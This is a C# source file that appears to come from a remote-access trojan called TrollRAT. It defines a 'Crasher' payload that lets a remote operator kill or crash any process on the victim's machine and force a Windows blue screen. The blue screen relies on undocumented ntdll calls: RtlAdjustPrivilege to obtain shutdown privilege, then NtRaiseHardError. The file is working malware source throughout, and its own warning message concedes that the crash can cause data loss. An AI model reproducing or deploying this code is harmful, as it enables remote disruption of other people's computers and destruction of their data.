using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using TrollRAT.Payloads;

namespace TrollRATPayloads.Payloads
{
    public class PayloadCrasher : Payload
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege,
                bool IsThreadPrivilege, out bool PreviousValue);

        protected class PayloadActionCrashWindows : DangerousPayloadAction
        {
            public PayloadActionCrashWindows(Payload payload) : base(payload) { }

            public override string WarningMessage => "<p>Crashing Windows should cause a BSOD.</p>" + 
                "<p>It is not recommended to use, even for trolling, because it can cause data loss and more.</p>" + 
                "<p>The used method is not documented, it may get patched in the future " +
                "and can cause different results than forcing a BSOD everytime.</p>" + 
                "<p>Do you still want to crash Windows?</p>";

            [DllImport("ntdll.dll", SetLastError = true)]
            public static extern void NtRaiseHardError(uint errorStatus,
                int a, int b, int c, /* Unused */
                int responseOption,
                out int response);

            public override string execute()
            {
                bool x; int y;
                RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, true, false, out x);
                NtRaiseHardError(0xc0000022, 0, 0, 0, 6 /* OptionShutdownSystem */, out y);
                return "alert('System should crash in a moment...');";
            }

            public override string Icon => null;
            public override string Title => "Crash Windows";
        }

        protected class PayloadSettingProcess : PayloadSettingSelectBase
        {
            public PayloadSettingProcess(int defaultValue, string title) : base(defaultValue, title) { }

            private Process[] processes;
            public Process SelectedProcess => processes[value];

            public override string[] Options
            {
                get
                {
                    Process currentSelection = (processes != null && processes.Length > 0) ? SelectedProcess : null;

                    processes = (from process in Process.GetProcesses()
                                 orderby process.Id
                                 select process).ToArray();

                    int[] pids = (from process in processes
                                  select process.Id).ToArray();

                    value = (currentSelection != null) ? Array.IndexOf(pids, currentSelection.Id) : 0;
                    if (value < 0)
                        value = 0;

                    return (from process in processes
                            select String.Format("{0} - {1}",
                            process.Id, process.ProcessName)).ToArray();
                }

                set { throw new NotImplementedException(); }
            }
        }

        protected PayloadSettingProcess process = new PayloadSettingProcess(0, "Process");

        protected class PayloadActionKillProcess : SimplePayloadAction
        {
            public PayloadActionKillProcess(Payload payload) : base(payload) { }

            public override string execute()
            {
                PayloadCrasher pc = (PayloadCrasher)payload;

                Process process = pc.process.SelectedProcess;

                try
                {
                    if (process.HasExited)
                        return "alert('The process is already dead.');";

                    process.Kill();
                    return "alert('The process has been killed successfully.');";
                } catch (Exception)
                {
                    return "alert('Failed to kill the Process.');";
                }
            }

            public override string Icon => null;
            public override string Title => "Kill Process";
        }

        protected class PayloadActionCrashProcess : SimplePayloadAction
        {
            public PayloadActionCrashProcess(Payload payload) : base(payload) { }

            public override string execute()
            {
                try
                {
                    PayloadCrasher pc = (PayloadCrasher)payload;

                    Process process = pc.process.SelectedProcess;

                    Process crasher = Process.Start(Path.Combine(Path.GetDirectoryName(
                        Assembly.GetExecutingAssembly().Location), "Crasher.exe"), process.Id.ToString());
                    crasher.WaitForExit();

                    if (crasher.ExitCode == 0)
                        return "alert('Thread created successfully. Process should now have been crashed.');";
                    else if (crasher.ExitCode == 1)
                        return "alert('The process is already dead.');";
                    else if (crasher.ExitCode == 2)
                        return "alert('Crashing the process failed.');";
                    else if ((crasher.ExitCode & 0x4000000) != 0)
                        return string.Format("alert('Failed to open the process handle.\\n\\n Error Code: {0}');",
                            crasher.ExitCode & (~0x4000000));
                    else if ((crasher.ExitCode & 0x8000000) != 0)
                        return string.Format("alert('Failed to create the thread.\\n\\n Error Code: {0}');",
                            crasher.ExitCode & (~0x8000000));
                } catch (Exception) // Very crappy exception handling
                {
                    return "alert('Crashing the process failed.');";
                }


                return "void(0);";
            }

            public override string Icon => null;
            public override string Title => "Crash Process";
        }

        public PayloadCrasher()
        {
            name = "Crasher";

            settings.Add(process);

            actions.Add(new PayloadActionKillProcess(this));
            actions.Add(new PayloadActionCrashProcess(this));
            actions.Add(new PayloadActionCrashWindows(this));
        }
    }
}
